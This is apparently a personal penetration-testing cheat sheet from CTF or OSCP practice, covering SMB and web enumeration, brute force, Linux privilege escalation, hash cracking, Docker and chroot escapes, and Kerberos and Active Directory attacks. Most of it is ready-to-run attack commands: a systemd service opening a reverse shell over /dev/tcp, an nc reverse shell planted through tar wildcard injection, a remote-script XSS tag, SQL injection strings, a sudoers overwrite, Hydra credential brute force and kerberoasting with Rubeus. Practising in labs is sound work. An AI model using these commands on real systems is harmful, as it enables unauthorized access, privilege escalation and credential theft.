# Table of contents

1. [Enum](#Enum)
   1. [SMB](#enum-smb)
   2. [RPC](#enum-rpc)
   3. [Networks](#enum-net)
   4. [Webapplications](#enum-webb)
      1. [Normal endpoints](#enum-webb-endp)
      2. [Subdomain enumeration](#enum-webb-subd)
      3. [Brute-force vulners](#enum-webb-bfvuln)
      4. [XSS](#xss)
      5. [Wordpress](#wpscan)
   5. [Bypasses](#bypasses)
   6. [Privesc](#privesc)
      1. [Root-Shell-Methods](#root_shell)
2. [Crunch](#crunch)
3. [Tools](#tools)
4. [Gen-Wordlists](#crunch)
5. [John](#john)
6. [Hydra](#hydra)
7. [Steganography](#stegano)
8. [Cronjobs](#cronjobs)
9. [Linux Exploits](#linux_exploits)
10. [Chroot Escape](#chroot_escape)
11. [Docker Security](#docker)
12. [Memcached](#memcached)
13. [Links](#links)

# Enum <a name="Enum"></a>

## SMB <a name="enum-smb"></a>

- `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.204.125`
  Logging in when pwd is complex =
- `echo username=milesdyson /npassword=)s{A&BlaBla > .smbclient.conf`
- `smbclient -A ./.smbclient.conf \\\\IP\\Share`
- `smbclient -L \\\\IP\\` <-- list shares
- `smb: \> put exploit.py` <-- upload file
- `smbclient -L \\\\IP\\ -U username`

## RPC enum <a name="rpc-enum"></a>

- `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.204.125`

## Networks <a name="enum-net"></a>

- `sudo nmap -p- -T4 -sC -sV -Pn IP-ADDRESS -oG pscan`
- `sudo nmap -p- -U IP-ADDRESS -oG pscan_udp`
- `sudo nmap -sS ip` <-- syn scan
- `sudo nmap -sF ip` <-- fin scan
- `sudo nmap -sN ip` <-- null scan
- `sudo nmap -sS -sF -sN ip` <-- all scans
- `sudo nmap -sS -sF -sN -Pn ip` <-- all scans with portscan
- `sudo nmap -sX ip` <-- xmas scan
- `sudo nmap -sA ip` <-- ack scan
- `sudo nmap -sW ip` <-- window scan

### Port knocking

TCP flags: FIN, SYN, RST, PSH, ACK, URG

- `hping3 -c 9 -F -p 7000 10.10.13.11` <-- FIN port knock
- `hping3 -c 9 -S -p 7000 10.10.13.11` <-- SYN port knock
- `hping3 -c 9 -R -p 7000 10.10.13.11` <-- RST port knock
- `hping3 -c 9 -P -p 7000 10.10.13.11` <-- PSH port knock
- `hping3 -c 9 -A -p 7000 10.10.13.11` <-- ACK port knock
- `hping3 -c 9 -U -p 7000 10.10.13.11` <-- URG port knock

## Webapplications <a name="enum-webb"></a>

### Normal endpoints <a name="enum-webb-endp"></a>

- /robots.txt <-- What search engines are not allowed to show
- /sitemap.xml <-- What user can look at

### Subdomain enumeration <a name="enum-webb-subd"></a>

- `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.mysite.com`
- `ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://website.com/ -mr "user exists"`
- `ffuf -w /usr/share/seclists/Usernames/Names/names.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://mysite.com/ -fc 200`
- `gobuster dir -u http://localhost:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
- `gobuster fuzz -u http://FUZZ.localhost:8080/ -w /usr/share/seclists/Discovery/Subdomains/subdomains-top1mil.txt`

### Brute-force vulnerabilities <a name="enum-webb-bfvuln"></a>

- `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://mysite.com/get?id=FUZZ`
- `ffuf -w /usr/share/seclists/Fuzzing/Databases/MySQL.fuzzdb.txt -u http://mysite.com/get?id=FUZZ`
- `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt -u http://mysite.com/get?id=FUZZ`
- `ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u http://mysite.com/get?id=FUZZ`
- `ffuf -w /usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt -u http://mysite.com/get?id=FUZZ`

### XSS <a name="xss"></a>

- `<script src="http://10.0.2.15:8080/maliciousJS.js" />`
- `<script>alert('XSS')</script>`
- `<img onerror="alert('XSS')" />`

### SQLi <a name="sqli"></a>

`' OR 1=1;--`
`' OR 1=1 order by 1--`
`' OR 1=1 union select 1`

### Delete Node modules

`rimraf node_modules`

### Wordpress <a name="wpscan"></a>

- `wpscan --url http://mysite.com/ -e vp --api-token TOKEN -o wpscan.txt`
- `wpscan --url http://mysite.com/blog --usernames admin --password /usr/share/wordlists/rockyou.txt --max-threads 50`

## Bypasses <a name="bypasses"></a>

### 403 forbidden

- `wget --user-agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/21.0" -r -nc -nH -np -e robots=off https://mysite.com`

## Privesc <a name="privesc"></a>

- `hostname`
- `uname -a`
- `cat /proc/version`
- `cat /etc/issue`
- `cat /etc/crontab`
- `cat /etc/exports`
- `cat /etc/group`
- `ps aux`
- `env`
- `sudo -l`
- `getcap -r / 2>/dev/null`
- `ls -l $(which pkexec)`
- `cat /etc/passwd | cut -d ":" -f 1` <-- cut -delimiter ":" -field 1
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `unshadow passwd.txt shadow.txt > unshadowed.txt`
- `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
- `lsattr <file>` < -- get file permissions

MITRE
Show kernel modules:

- `lsmod`
  Unhide processes:
- `kill -63 0`
  Hide processes:
- `kill -31 <pid>`
  Get root priv:
- `kill -64 0`

## Password bypass

- `cd /tmp && echo "www-data ALL=NOPASSWD:ALL" > sudoers`
- Find a program that gives you escalated privs `find / -type f -perm -04000 -ls 2>/dev/null`
- In this case it is wget `wget http://127.0.0.1/sudoers -O /etc/sudoers`
- `sudo bash`

### Root shell methods <a name="root_shell"></a>

- Vim
  - M:!sh
  - M:term
- Nmap
  - Nmap -interactive
  - !sh
- Systemctl

  - !sh
  - ```
    echo '
    [Unit]
    Description=rooot

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.10.6/1234 0>&1"

    [Install]
    WantedBy=multi-user.target' > root.service

    ```

    - `systemctl enable root.service`
    - `systemctl start root`

- Menu

  - `echo /bin/sh > curl`
  - `chmod 777 curl`
  - `export PATH=/tmp:$PATH`
  - `/usr/bin/menu`

- Man
  - `sudo man man`
  - `!sh`

# Generate Wordlists <a name="crunch"></a>

## Crunch (min, max, regex)

- `crunch 6 12 0123456789 > wordlist.txt` <-- Generate a wordlist with 6-12 numbers
- `crunch 6 12 abcdefghijklmnopqrstuvwxyzÅÄÖ > wordlist.txt` <-- Generate a wordlist with 6-12 letters
- `crunch 10 10 password%^ > wordlist.txt` <-- Generate a wordlist that start with password and end with any number and any special character
- , = uppercase letters
- @ = lowercase letters
- % = numbers
- ^ = special characters

## Crunch combination of strings (min,max,string array)

- `crunch 1 10 -p my com bination > wordlist.txt`

# Tools <a name="tools"></a>

## Find

- `find . -name flag1.txt` . = current directory
- `find /home -name flag1.txt` /home = specific directory
- `find . -type d -name mydir` -type d = directory
- `find . -type f -perm 0777` <-- file with permissions 777 (read/write by all)
- `find / -perm -222 -type d 2>/dev/null` <-- find dir writeable
- `find / -perm -o x -type d 2>/dev/null` <-- find executable folders
- `find / -perm -u=s -type f 2>/dev/null` <-- find higher priviledge files SUID (chmod 4000)
- `find / -not -type l -perm -o+w ` <-- World writeable files
- `find / -perm -g=s -type f 2>/dev/null` <-- SGID (chmod 2000)
- `find / -user root -perm -4000 -exec ls -ldb {} \;`
- `find / -name docker.sock 2>/dev/null` <-- find docker socket
- `find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null` <-- Find every file writable by a group

## Grep

- `grep -r "flag1" .` <-- search for flag1 in current directory
- `grep -r "flag1" /home` <-- search for flag1 in specific directory
- `grep -r "flag1" . -type d` <-- search for flag1 in current directory and subdirectories
- `grep -nr "db_user"`
- `grep -nri "db_user" /usr/bin` <-- search for db_user recursively in /usr/bin

## Untar

- `tar -xvf myfile.tar`
- `tar -zxvf myfile.tar.gz`
- `tar -jxvf myfile.tar.bz2`

## Adding custom scripts

- `export PATH="$HOME/bin:$PATH"` <-- in bashrc/zschrc or other
- Start writing scripts in the folder
- `dos2unix mypy.py`

## Grip

- `sudo -H pip install grip`
- `grip -b markdown.md`

# JohnTheRipper <a name="john"></a>

## Basic hashes

1. Id the hash
   1. [hash-identifier](https://github.com/blackploit/hash-identifier)
   2. `cat hash.txt | python3 hash-id.py`
2. Find correct format
   1. `john --list=formats | grep -iF "md5"`
3. Extract password
   1. `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

## PDF

1. `pdf2john hash.pdf > hash.txt`
2. Repeat basic hashes

## GPG

1. `gpg`

## Zip

1. `zip2john hash.zip > hash.txt`
2. Repeat basic hashes

### Zip cracking

1. `fcrackzip -D -u zipfile.zip -p /usr/share/wordlist/rockyou.txt`

## PFX

1. `pfx2john hash.pfx > hash.txt`
2. `john --wordlist=list hash.txt`

## Rar

1. `unrar e hash.rar > hash.txt`
2. Repeat basic hashes

## SSH

1. `ssh2john hash.rsa > hash.txt`
2. Repeat basic hashes

# Hashcat

- `hashcat -m 0 -a 0 hash.txt wordlist.txt`

# Hydra <a name="hydra"></a>

-t = Number of threads
-l = single username
-P = password list
-V = verborse output for every attempt

- http-form-post = `hydra -l miles -P /usr/share/wordlists/rockyou.txt 10.10.89.9 http-form-post "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=incorrect"`
- `hydra -l admin@dummybank.com -P /usr/share/wordlists/rockyou.txt dummybank.com -s 5000 http-post-form "/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Error\:\"Invalid email or password.\""`

# Steganography <a name="stegano"></a>

## steghide

<b>embedfile</b> = The file that contains a secret message<br/>
<b>coverfile</b> = The file that will be used to embed the secret message<br/>
<b>stegofile</b> = The file that has the secret inside of it<br/>

- `steghide embed -ef secret.txt -cf test1.jpg -p thisIsMyPassword` <-- hide file
- `steghide extract -sf test1.jpg -p thisIsMyPassword` <-- extract file

# Cronjobs <a name="cronjobs"></a>

List jobs = `crontab -l`
Edit jobs = `crontab -e`

# Linux exploits <a name="linux_exploits"></a>

## Dump memory of a process

Find the process id with: `ps aux | grep "process"`
Then create the script below in a sh file and chmod +x it.

```bash
#!/bin/bash
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
  gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

Finally: `./script.sh <process_id>`
Now: `strings *.dump | grep "secret"`

## Wildcard exploit

### Reverse shell

- `printf '#!/bin/bash\nnc -e /bin/bash 127.0.0.1 1234' > shell.sh`
- Create some special files which will act as arguments to the caller process and execute shell.sh
- `touch -- '--checkpoint-action=exec=sh shell.sh'`
- `touch -- '--checkpoint=1`

### Sudo bash (tar wildcard exploit)

- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > pwn.sh`
- `touch /home/user/backupfolder/--checkpoint=1`
- `touch /home/user/backupfolder/--checkpoint-action=exec=sh\ pwn.sh`
- `/tmp/bash -p`

# Capabilities

- `getcap -r / 2>/dev/null`

# Chroot escape <a name="chroot_escape"></a>

## C

```
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
mkdir("chroot-dir", 0755); chroot("chroot-dir");
for(int i = 0; i < 1000; i++) { chdir("..");
}
chroot("."); system("/bin/bash");
}
```

# Docker Security <a name="docker"></a>

## Basic commands

- List images: `docker images`
- List containers: `docker ps -a`
- Run docker image with shared space: `docker run -it -v /:/host ubuntu:latest /bin/bash`
- List capabilities: `capsh --print`
- List disks: `fdisk -l`
- Scan open ports: `nc -v -n -w2 -z ip 1-65535`
- Show network info: `netstat -anlp`

## Examples

1. Check for docker.socket
2. Check for any docker images `docker images`
   1. Run docker image with shared space `docker run -it -v /:/host ubuntu:18.04 bash`
   2. Check capabilities `capsh --print`
      1. Find SYS_ADMIN capability
      2. `cd host`
      3. `chroot ./ bash`
      4. Get the flag `cat root/flag.txt`

# Redis <a name="redis"></a>

## Basic commands

- Nmap scan: `nmap -p 6379 --script redis-info 10.10.30.12`
- Connect to redis: `redis-cli -h 10.10.30.12`
- Get all keys: `KEYS *`
- Get value of key: `get key`
- Get value of key list: `LRANGE key 0 -1`
- Get value of key set: `SMEMBERS key`
-

# MySQL <a name="mysql"></a>

## Basic commands

- Connect to MySQL: `mysql -h 10.10.19.12 -u root`
- Show databases: `show databases`
- Show tables: `show tables`

# Memcached <a name="memcached"></a>

## Basic commands

- `telnet localhost 11211` <-- open memcached telnet
  - `stats` <-- show stats
  - `stats slabs` <-- show slabs
  - `stats items` <-- show items
  - `stats settings` <-- show settings
  - `lru_crawler metadump all` <-- dump metadata

# JWT-Pwn <a name="jwt"></a>

- Decode middle of JWT: `echo JWT | base64 -d | cut -d. -f2`
- Brute-force JWT: `jwtcat.py -t jwttoken -w wordlist -v`

# Forensic <a name="forensic"></a>

## Memory <a name="mem-forensic"></a>

- Volatility

List all profiles: `vol.py --info`
Extract cpu details from memory dump: `vol.py -f memory_dump.img linux_cpuinfo`
Extract list of open tcp connections from memory dump: `vol.py -f memory_dump.img linux_netstat`
List all processes: `vol.py -f memory_dump.img linux_pslist` or `vol.py -f memory_dump.img linux_pstree`
Extract IP addresses from memory dump: `vol.py -f memory_dump.img linux_ifconfig`
Identify applications using promiscuous socket from memory dump: `vol.py -f memory_dump.img linux_list_raw`
Recover bash history from memory dump: `vol.py -f memory_dump.img linux_bash`
Get IP and MAC addresses from memory dump: `vol.py -f memory_dump.img linux_arp`
Dump binary using pid: `vol.py -f memory_dump.img linux_procdump -p <pid> --dump-dir .`

# Devsecops <a name="devsecops"></a>

- `devskim analyze .`
- `devskim analyze . -s critical`
- `trufflehog --regex . `
- `trufflehog --json --regex . | python -m json.tool` <-- dump output as json

Nginx configuration helper: Gixy

# Buffer Overflow

Immunity Debugger
!mona config -set workingfolder
!mona bytearray -b "\x00"
!mona compare -f c:\mona\oscp\bytearray.bin -a number
!mona jmp -r esp -cbp "\x address"
https://defuse.ca/online-x86-assembler.htm#disassembly2
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x01\xA7\xFA\x30"
retn = reversed address

# Active Directory

AD = Collection of machines and servers connected inside of domains, that are part of a bigger forest of domains.

AD functioning bits and pieces =

- Domain Controllers
  - Windows Server that has Active Directory Domain Services installed and has been promoted to a domain controller in the forest.
    - Holds the AD DS data store
      - Contains the NTDS.dit - A database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
      - Stored by default in %SystemRoot%\NTDS
      - Accessible only be the domain controller
    - Handles authentication and authorization services
    - Replicate updates from other domain controllers in the forest
    - Allows admin access to manage domain resources
- Forests, Trees, Domains
  - Defines everything
  - Collection of one or more domain trees inside of an AD network. It is what categorizes the parts of the network as a whole.
  - Trees - A hierarchy of domains in AD DS
  - Domains - Used to group and manage objects
  - Organizational Units - Containers for groups, computers, users, printers and other OUs
  - Trusts - Allows users to access resources in other domains
  - Objects - users, groups, printers, computers, shares
  - Domain Services - DNS Server, LLMNR, IPv6
  - Domain Schema - Rules for object creation
- Users + Groups
  - Default groups: Administrators, guest
  - Users:
    - Domain Admins: Big boss
    - Service Accounts: Not often used, except for server maintenance, they are required by Windows for SQL to pair a service with a service account
    - Local Administrators: Can make changes to local machines as an admin and may even be able to control other normal users, but cant access the domain controller
    - Domain users: Everyday users. They can log in to the machines they have auth to access and might have admin rights to machines
  - Groups:
    - Domain controllers: All domain controllers in the domain
    - Domain Guests: All domain guests
    - Domain Users: All domain users
    - Domain computers: All workstations and servers joined to the domain
    - Domain Admins: Designated admins of the domain
    - Enterprise admins: Designated admins of the enterprise
    - Schema admins: Designated admins of the schema
    - DNS admins: DNS admin group
    - DNS update proxy: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers)
    - Allowed RODC Password Replication Group: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    - Group Policy Creator Owners - Members in this group can modify group policy for the domain
    - Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    - Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    - Cert Publishers - Members of this group are permitted to publish certificates to the directory
    - Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    - Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    - Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    - Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    - Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    - RAS and IAS Servers - Servers in this group can access remote access properties of users
- Trusts
  - Domain Trusts Overview: Possible to abuse the trusts in order to move laterally throughout the network
    - Directional: The direction of the trust flows from a trusting domain to a trusted domain
    - Transitive: The trust relationship expands beyond just two domains to include other trusted domains
- Policies
  - Dictates how the server operates and what rules, like domain groups but instead of permissions they contain rules.
  - Big factor for attackers when enumerating an active directory network.
    - You can disable windows defender on all machines on the domain
    - You can digitally sign communication, disable or enamble smb signing on the domain controller
- Domain Services
  - Services that the domain controller provides to the rest of the domain or tree. Default domain services:
    - LDAP: Lightweight Directory Access Protocol, provides communication between applications and directory services
    - Certificate Services: Allows the domain controller to create, validate, and revoke public key certificates
    - DNS, LLMNR, NBT-NS: Domain Name Services for identifying IP hostnames
  - Domain Authentication Overview:
    - Most important and vulnerable part of AD: The authentication protocols set in place.
    - 2 types of authentication in place for AD: NTLM and Kerberos
      - Kerberos: The default authentication service for AD uses ticket-granting tickets and service tickets to authenticate users and give users access to resources across the domain.
      - NTLM: Default Windows authentication protocol uses an encrypted challenge/response protocol
- Azure AD:
  - Windows Server AD - Azure AD
  - LDAP - Rest APIs
  - NTLM - OAuth/SAML
  - Kerberos - OpenID
  - OU Tree - Flat Structure
  - Domains and Forests - Tenants
  - Trusts - Guests
-

Why = Allows for control and monitoring of users computers through a single domain controller. A single user can sign in to any computer on the active directory network and have access to their files and folders in the server and locally. So it becomes possible to log in to any machine without having to set up multiple users on a machine.

Physical ad = On-premise machines, anything from domain controllers to storage servers to domain user machines.

# Kerberos

Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
  Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## Pre authentication

AS-REQ: The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

## TGT

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

## ST

Two parts:

- Service portion: User details, session key, encrypts the ticket with the service account NTLM hash
- User portion: Validity timestamp, session key, encrypts with the tgt session key

## Kerberos Authentication Overview

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access

## Attack privilege requirements

Kerbrute Enumeration - No domain access required
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required
Silver Ticket - Service hash required
Skeleton Key - Full domain compromise (domain admin) required

## Enumeration

Kerbrute = https://github.com/ropnop/kerbrute/releases
User.txt = https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local /usr/share/wordlists/AD/User.txt`

## Harvesting tickets

`Rubeus.exe harvest /interval:30`
`echo 10.10.183.221 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
`Rubeus.exe brute /password:Password1 /noticket`
OR remote
`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.131.2 -request`

`Rubeus.exe asreproast`
`hashcat -m 18200 hash.txt pass.txt`

Mimikatz = Post exploitation tool, dumping user credentials

# Windows Post Exploitation

## Enumeration

`powershell -ep bypass` <-- Bypass execution policy of powershell
`. .\PowerView.ps1` <-- Start powerview

Enumerate Domain Users=`Get-NetUser | select cn`
Enumerate Domain Groups=`Get-NetGroup -GroupName *admin*`

Cheat sheet at https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

# Nessus

`sudo systemctl start nessusd.service`

# DNS enumeration

# Links <a name="links"></a>

- [GTFOBin](https://gtfobins.github.io/)
- [Revshells](https://revshells.com/)
- [xsshunter](https://xsshunter.com)
- [DNSDumpster](https://dnsdumpster.com/)
- [Shodan](https://shodan.io/)
- [Ettercap](https://www.ettercap-project.org/)
- [Bettercap](https://www.bettercap.org/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
- [WindowsExploitSuggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [JsShell](https://github.com/shelld3v/JSshell)
- [PwnKit](https://github.com/ly4k/PwnKit)
- [Firepwd](https://github.com/lclevy/firepwd)
- [Hacktricks](https://github.com/carlospolop/hacktricks)
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [CSPP](https://github.com/BlackFan/client-side-prototype-pollution)
- [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content)
- [hash-identifier](https://github.com/blackploit/hash-identifier)
- [JWTCat](https://github.com/aress31/jwtcat)
- [Trufflehog](https://github.com/trufflesecurity/trufflehog)
- [Devskim](https://github.com/microsoft/DevSkim)
- [Snyk](https://snyk.io/)
- [Volatility](https://github.com/volatilityfoundation/volatility)
- [Volatility Cheat Sheet](https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)
- [Linux Privesc Cheat Sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
- [Gixy](https://github.com/yandex/gixy)
- [SSI payloads](https://marduc812.com/2018/03/24/list-of-ssi-payloads/)
- [Kerbrute](https://github.com/ropnop/kerbrute/releases)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Defuse](https://defuse.ca/online-x86-assembler.htm#disassembly2)
